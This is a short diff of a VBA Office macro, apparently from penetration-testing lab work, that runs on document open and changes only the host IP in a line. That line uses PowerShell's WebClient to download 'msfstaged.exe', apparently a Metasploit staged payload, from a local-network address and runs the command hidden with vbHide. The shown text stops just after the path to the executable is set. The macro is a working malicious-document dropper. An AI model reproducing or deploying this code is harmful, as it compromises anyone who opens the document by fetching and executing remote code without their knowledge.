@@ -52,7 +52,7 @@ Sub AutoOpen()
 End Sub
 Sub MyMacro()
   Dim str As String
-  str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
+  str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/msfstaged.exe', 'msfstaged.exe')"
   Shell str, vbHide
   Dim exePath As String
   exePath = ActiveDocument.Path + "\msfstaged.exe"
